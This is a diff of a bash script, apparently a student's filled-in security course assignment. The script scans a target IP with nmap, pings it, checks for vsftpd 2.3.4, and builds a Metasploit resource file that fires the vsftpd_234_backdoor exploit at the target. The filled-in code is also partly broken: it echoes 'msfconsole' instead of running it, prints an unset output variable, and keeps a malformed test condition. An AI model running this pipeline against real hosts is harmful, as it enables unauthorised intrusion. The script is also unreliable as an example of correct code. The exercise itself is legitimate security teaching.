@@ -17,7 +17,7 @@ echo "#1 Setting Constants"
 # 1. Create a variable called STUDENT_NAME and assign the value of your name for the report 
 # also and set the TARGET_IP to the *first* argument passed when the script is executed.
 # Create Varaiable HERE
-STUDENT_NAME="jonathan"
+STUDENT_NAME="Jonathan"
 
 TITLE="Security Report prepared for CSCI 1411 - Fall 2023"
 RIGHT_NOW=$(date +"%x %r %Z")
@@ -25,8 +25,11 @@ TIME_STAMP="Updated on $RIGHT_NOW by $STUDENT_NAME"
 # Assign a value to TARGET_IP
 # (HINT: USE the arguement passed when the script is ran. 
 # Do not hard code an IP Address here)
+if [ $# -eq 0 ]; then
+    echo "Usage: $0 <TARGET_IP>"
+    exit 1
+fi
 TARGET_IP="$1"
-
 echo "------------------------------" >&2
 
 ##### Functions #####
@@ -38,7 +41,7 @@ function target_info()
 {
     echo "<h2>Target IP Address</h2>"
     echo "<pre>"
-    echo "IP Address:$TARGET_IP " #YOUR CODE HERE
+    echo "IP Address: $TARGET_IP " #YOUR CODE HERE
     echo "</pre>"
 }   # end of target_info
 
@@ -50,7 +53,7 @@ function target_info()
 
 # EXAMPLE: nmap <parameters>
 # YOUR CODE HERE
-nmap -A -p- $TARGET_IP
+nmap -A -T4 -p- $TARGET_IP > nmap.txt
 
 # 3b. Now that the results are stored in a text file nmap.txt, this can be read to extract 
 # key pieces of information. Below in target_machine function, write a command that reads nmap.txt
@@ -60,7 +63,8 @@ function target_machine()
 {
     echo "<h2>System Machine Name</h2>"
     echo "<pre>"
-    #YOUR CODE HERE
+    COMPUTER_NAME=$(grep "Nmap scan report for" nmap.txt | sed 's/.*for \([[:alnum:]-]*\).*/\1/')
+    echo "Computer Name: $COMPUTER_NAME"
 
     echo "</pre>"
 
@@ -76,8 +80,7 @@ function target_ping()
 {
     echo "<h2>Target Ping Response</h2>"
     echo "<pre>"
-    #YOUR CODE HERE
-
+    ping -c 4 $TARGET_IP
     echo "</pre>"
 }   # end of target_ping
 
@@ -95,7 +98,7 @@ function target_ports_open()
     if [ "$up'=='" ]; then
         echo "<h2>Ports open</h2>"
         echo "<pre>"
-        # YOUR CODE HERE
+        nmap -sV $TARGET_IP | grep "open"
 
         echo "</pre>"
     fi
@@ -110,7 +113,7 @@ function target_ports_open()
 function target_attack_vsftpd()
 {  
     echo "<h2>Exploits</h2>"
-        if target_ports_open | grep "YOUR CODE HERE"; then
+        if target_ports_open | grep "vsftpd 2.3.4"; then
             exploit_vsftpd
         else
             echo "Remote Host does not contain vsftpd vulnerability"
@@ -137,17 +140,17 @@ function exploit_vsftpd()
     # Output the command to create a new resource script file 
     # called vsftpd.rc using either > or >>
     # YOUR CODE HERE
-
-
-    # Next, append to the resource file vsftpd.rc setting the RHOST
+    echo "msfconsole"
+    echo "use exploit/unix/ftp/vsftpd_234_backdoor" >> vsftpd.rc
+    # Next, apped to the resource file vsftpd.rc setting the RHOST
     # to your target IP variable
     # YOUR CODE HERE
-
+    echo "set RHOST $TARGET_IP" >> vsftpd.rc
 
     # One of the last calls in the Resource script is to execute the exploit.
     # Append "exploit -z" the -z parameter will execute the exploit in the background
     # YOUR CODE HERE
-
+    echo "exploit -z" >> vsftpd.rc
 
     # DO NOT MODIFY
     echo "exit -y" >> vsftpd.rc
@@ -161,12 +164,11 @@ function exploit_vsftpd()
     echo "<h3>Results of Vsftpd exploit attempt on target</h3>"
     echo "<pre>"
     # YOUR CODE HERE
-
+    echo "$metasploit_output"
 
     echo "</pre>"
 
 }   # end of exploit_vsftpd
-
 # Function: write_html
 # Purpose: To write out to generate the full report in HTML
 function write_html()
@@ -193,6 +195,8 @@ echo "<html>
         $(echo "#6 Checking for vulnerability" >&2)
         $(target_attack_vsftpd)
         <h1>END OF REPORT</h1>
+    </body>
+</html>
 "
 }
 
